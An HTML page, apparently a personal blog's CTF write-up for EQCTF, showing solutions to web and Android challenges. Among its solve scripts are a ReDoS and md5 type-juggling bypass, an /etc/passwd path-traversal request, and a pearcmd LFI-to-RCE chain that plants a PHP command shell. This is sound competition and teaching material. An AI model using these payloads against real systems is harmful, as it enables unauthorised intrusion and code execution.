@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Megat Zafran">
+
+
+    <meta name="subtitle" content="that one socially inept kid">
+
+
+    <meta name="description" content="whoami">
+
+
+    <meta name="keywords" content="aan0303, megat, ilikeronnnnii">
+
+
+<title>EQCTF | aan0303</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aan&#39;s stash</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aan&#39;s stash</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">EQCTF</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Megat Zafran</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">January 19, 2025&nbsp;&nbsp;15:03:30</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeups/">Writeups</a>
+                            
+                                <a href="/categories/Writeups/Local-Competition/">Local Competition</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Sourceful-Egg"><a href="#Sourceful-Egg" class="headerlink" title="Sourceful Egg"></a>Sourceful Egg</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>First you need to send a <code>POST</code> request with the data <code>egg</code> to access inside the <code>if</code> block.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;egg&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    random codes...</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re not even touching the egg...?!!!&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Anyway, here&#x27;s a picture of an egg &lt;br&gt;&lt;br&gt;&lt;img src=&#x27;img/togepi.gif&#x27;&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Now inside the <code>if</code> block there are <code>two functions</code> you need to consider.</p>
+<h4 id="eggSecret-Function"><a href="#eggSecret-Function" class="headerlink" title="eggSecret Function"></a>eggSecret Function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$secretHash</span> = <span class="string">&#x27;00e39786989574093743872279278460&#x27;</span>; <span class="comment">//can remove the first &#x27;0&#x27;</span></span><br><span class="line"> <span class="variable">$eggWorthyStatus</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;eggSecret&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;eggSecret&#x27;</span>]) == <span class="variable">$secretHash</span>) &#123; &lt;-- vulnerable condition</span><br><span class="line">          <span class="variable">$eggWorthyStatus</span> = <span class="literal">true</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$eggWorthyStatus</span> = <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Php is a bit weird, if you <code>md5(240610708)</code> is is technically will be the same as <code>0</code> but it only works in one condition, which is when using <code>==</code> operator.</p>
+<blockquote>
+<p><code>md5(240610708) = 0e462097431906509019562988736854 = 0 (when ==)</code></p>
+</blockquote>
+<p>So if we are comparing <code>0e462097431906509019562988736854</code> and <code>00e39786989574093743872279278460</code> with <code>==</code> it is technically true because <code>0 == 0</code></p>
+<h4 id="egg-Function"><a href="#egg-Function" class="headerlink" title="egg Function"></a>egg Function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$egg</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;egg&#x27;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(.*?)+$/s&quot;</span>, <span class="variable">$egg</span>)) &#123; &lt;-- vulnerable condition</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Find me the egg please&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$eggWorthyStatus</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;You are a true egg connoisseur! Here is your egg flag: &quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Find me the egg please&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>That if condition is vulnerable to <a target="_blank" rel="noopener" href="https://learn.snyk.io/lesson/redos">ReDoS</a>, to bypass it just spam as many <code>AAA&#39;s</code> as you can.</p>
+<h3 id="Solve-Script"><a href="#Solve-Script" class="headerlink" title="Solve Script"></a>Solve Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://135.181.88.229:33722?eggSecret=240610708&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">33009</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Length&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&#x27;egg&#x27;</span>: payload&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="King-Brews"><a href="#King-Brews" class="headerlink" title="King Brews"></a>King Brews</h2><h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>This is blackbox challenge so I can’t show you the source code.</p>
+<p>If you press any menu, you will be sending <code>GET</code> request with the parameter <code>page</code> like so:-</p>
+<p><a target="_blank" rel="noopener" href="http://135.181.88.229:50003/?page=about.php">http://135.181.88.229:50003/?page=about.php</a></p>
+<h3 id="Solve-Script-1"><a href="#Solve-Script-1" class="headerlink" title="Solve Script"></a>Solve Script</h3><p>To test if the website is vulnerable to LFI, you can try to do the good ol’ trick <code>../../../../</code></p>
+<p><a target="_blank" rel="noopener" href="http://135.181.88.229:50003/?page=../../../../../../etc/passwd">http://135.181.88.229:50003/?page=../../../../../../etc/passwd</a></p>
+<p><img src="/images/imageEq.png" alt="alt text"></p>
+<p>If you somehow managed to read the <code>/etc/passwd</code> which is a sensitive file that means the website is vulnerable to LFI.</p>
+<p>So now, all you need to do is find the flag, the challenge creator actually provided a hint where the flag is located.</p>
+<p><img src="/images/imageEq2.png" alt="alt text"></p>
+<p>If you hover on that button, it redirect to <code>menu.php</code>, so let’s try to find out how to read <code>menu.php</code></p>
+<p>You can actually chain <code>LFI</code> to <code>RCE</code> if you get the code allows you to include <code>php wrapper</code> in input or if the website has <code>pearcmd</code> enabled.</p>
+<p>In this case I’m using this method instead <a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md#lfi-to-rce-via-php-pearcmd">Pearcmd LFI to RCE</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://135.181.88.229:50003&quot;</span></span><br><span class="line"></span><br><span class="line">r1 = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/exec.php+-d+man_dir=&lt;?echo(system($_GET[&#x27;c&#x27;]));?&gt;+-s+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r1.text)</span><br><span class="line"></span><br><span class="line">r2 = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?page=/tmp/exec.php&amp;c=cat+menu.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r2.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Secret-Access-Unintended"><a href="#Secret-Access-Unintended" class="headerlink" title="Secret Access (Unintended)"></a>Secret Access (Unintended)</h2><h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>We need to send both <code>secret</code> and <code>code</code> parameters using <code>GET</code> request.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;Missing required parameters.&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Right after that there are couple of <code>header</code> request that you need to include to follow the <code>if</code> condition requirement.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REMOTE_IP&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REMOTE_IP&#x27;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something is not quite right...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] !== <span class="string">&#x27;CTF-Challenge-Agent&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something is not quite right...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_AUTH_KEY&#x27;</span>]) || !<span class="title function_ invoke__">is_valid_auth_key</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_AUTH_KEY&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Something is not quite right...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_valid_secret</span>(<span class="variable">$secret</span>) &amp;&amp; <span class="title function_ invoke__">is_valid_code</span>(<span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not bad! Here is your flag: [REDACTED]&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Parameter value incorrect&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Then, you need to find out how to decode the <code>secret</code> value from this function, actually, the intended solution is to do <code>php type juggling</code> but I managed to decode everything one by one and <code>URL Encode</code> the values lol.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_secret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys1</span> = [<span class="number">12</span>, <span class="number">23</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">67</span>, <span class="number">78</span>, <span class="number">89</span>, <span class="number">90</span>]; <span class="comment">// XOR Keys</span></span><br><span class="line">    <span class="variable">$keys2</span> = [<span class="number">91</span>, <span class="number">82</span>, <span class="number">73</span>, <span class="number">64</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">37</span>, <span class="number">28</span>, <span class="number">19</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$encoded_parts</span> = [</span><br><span class="line">        <span class="string">&#x27;ND0=&#x27;</span>, <span class="string">&#x27;Yz0=&#x27;</span>, <span class="string">&#x27;Ij0=&#x27;</span>, <span class="string">&#x27;TT0=&#x27;</span>, <span class="string">&#x27;ZD0=&#x27;</span>, <span class="string">&#x27;bz0=&#x27;</span>, <span class="string">&#x27;dz0=&#x27;</span>, <span class="string">&#x27;cj0=&#x27;</span>, <span class="string">&#x27;cz0=&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$order</span> = [<span class="number">6</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$decoded_secret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reassembled</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$order</span> <span class="keyword">as</span> <span class="variable">$index</span>) &#123;</span><br><span class="line">        <span class="variable">$reassembled</span> .= <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$encoded_parts</span>[<span class="variable">$index</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$reassembled</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$reassembled</span>[<span class="variable">$i</span>]) ^ <span class="variable">$keys2</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$decoded_secret</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$char</span> ^ <span class="variable">$keys1</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$decoded_secret</span>; &lt;-- actually you can just host it locally <span class="keyword">and</span> get the values straight <span class="title function_ invoke__">away</span> (got funny chars so url encode it is better)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strcmp</span>(<span class="variable">$secret</span>, <span class="variable">$decoded_secret</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The <code>secret</code> values you should get <code>+x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D</code>.</p>
+<p>Next we have <code>is_valid_code()</code> function, for this one you need to do <code>php type juggling</code> but using empty array, so <code>code=[]</code>.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_code</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$code</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$code</span> !== <span class="string">&#x27;0&#x27;</span> &amp;&amp; <span class="variable">$code</span> !== <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The last function is actually to ensure that the <code>X-AUTH-KEY</code> header to have a specific pattern of value</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_auth_key</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$key</span>, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">&quot;auth-&quot;</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>) === <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>substr($key, 0, 5) === &quot;auth-&quot;</code> - Must start with exactly “auth-“</li>
+<li><code>strlen($key) === 10</code> - Total length must be exactly 10 characters</li>
+</ol>
+<h3 id="Solve-Script-2"><a href="#Solve-Script-2" class="headerlink" title="Solve Script"></a>Solve Script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://135.181.88.229:33430/?secret=%20x%18PBP_x-%3Dr%3Dc%3D%22%3Do%3D&amp;code=[]&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;CTF-Challenge-Agent&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;X-REMOTE-IP&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;X-AUTH-KEY&#x27;</span>: <span class="string">&#x27;auth-12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(url, headers=headers)</span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode())</span><br></pre></td></tr></table></figure>
+
+<h2 id="Protecc"><a href="#Protecc" class="headerlink" title="Protecc"></a>Protecc</h2><h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><h3 id="Solve-Script-3"><a href="#Solve-Script-3" class="headerlink" title="Solve Script"></a>Solve Script</h3><h2 id="PAAS"><a href="#PAAS" class="headerlink" title="PAAS"></a>PAAS</h2><h3 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h3><h3 id="Solve-Script-4"><a href="#Solve-Script-4" class="headerlink" title="Solve Script"></a>Solve Script</h3><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="Who’s-that-Pukimon"><a href="#Who’s-that-Pukimon" class="headerlink" title="Who’s that Pukimon"></a>Who’s that Pukimon</h2><p>First off, try to get the source code of the apk by either <code>unzipping</code> normally or you can use <code>MobSF Framework</code>.</p>
+<p>Analyzing the source codes, there are 7 potential activities files</p>
+<ol>
+<li><strong><em>io.eqctf.pukimon.MainActivity</em></strong></li>
+<li>com.google.firebase.auth.internal.GenericIdpActivity</li>
+<li>com.google.firebase.auth.internal.RecaptchaActivity</li>
+<li>androidx.credentials.playservices.HiddenActivity</li>
+<li>com.google.android.gms.auth.api.signin.internal.SignInHubActivity</li>
+<li>com.google.android.gms.common.api.GoogleApiActivity</li>
+<li>com.google.android.play.core.common.PlayCoreDialogWrapperActivity</li>
+</ol>
+<p>By looking at the names <code>io.eqctf.pukimon.MainActivity</code> is definitely the MainActivity file and apart from that <code>com.google.firebase.auth.internal.GenericIdpActivity</code> and <code>com.google.firebase.auth.internal.RecaptchaActivity</code> gives us a clear view that this apk is using <code>Firebase</code> as its database.</p>
+<h3 id="Content-of-MainActivityKt-java"><a href="#Content-of-MainActivityKt-java" class="headerlink" title="Content of MainActivityKt.java"></a>Content of MainActivityKt.java</h3><p>So this file can be found inside <code>io.eqctf.pukimon.MainActivity</code>, I prompted it to gpt cuz I’m bad at reading code.</p>
+<p>This function here checks if our input converted to hex matches the value <code>5368726f6f6d6973686965</code>.</p>
+<blockquote>
+<p>Convert Hex to ASCII<br>5368726f6f6d6973686965 &#x3D;&#x3D; Shroomishie</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">a</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bytes = str.getBytes(Charsets.UTF_8);</span><br><span class="line">    <span class="keyword">if</span> (Intrinsics.areEqual(ArraysKt.joinToString$<span class="keyword">default</span>(bytes, <span class="string">&quot;&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="literal">null</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Function1</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">invoke</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> MainActivityKt.a$lambda$<span class="number">3</span>(((Byte) obj).byteValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">30</span>, <span class="literal">null</span>), <span class="string">&quot;5368726f6f6d6973686965&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>When correctly guessed, it logs the flag, you can retrieve the value either by reading the <code>source code</code> or by using <code>adb logcat</code> command.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] decode = Base64.decode(<span class="string">&quot;AEUAUQBDAFQARgB7ADEAVABzAF8AUwBoAHIAMABvAE0AcgAxAHMASABpAEUAIQAhACEAIQB9&quot;</span>, <span class="number">0</span>);</span><br><span class="line">Log.d(<span class="string">&quot;Flag&quot;</span>, <span class="string">&quot;Congratz on guessing the pokemon: &quot;</span>.concat(<span class="keyword">new</span> <span class="title class_">String</span>(decode, Charsets.UTF_8)));</span><br></pre></td></tr></table></figure>
+
+<h2 id="Capture-that-Pukimon"><a href="#Capture-that-Pukimon" class="headerlink" title="Capture that Pukimon"></a>Capture that Pukimon</h2><p>This challenge you need to intercept the request that the mobile is making to <code>Firebase</code>. How do I know that it is making some kind of communication to <code>Firebase</code>?</p>
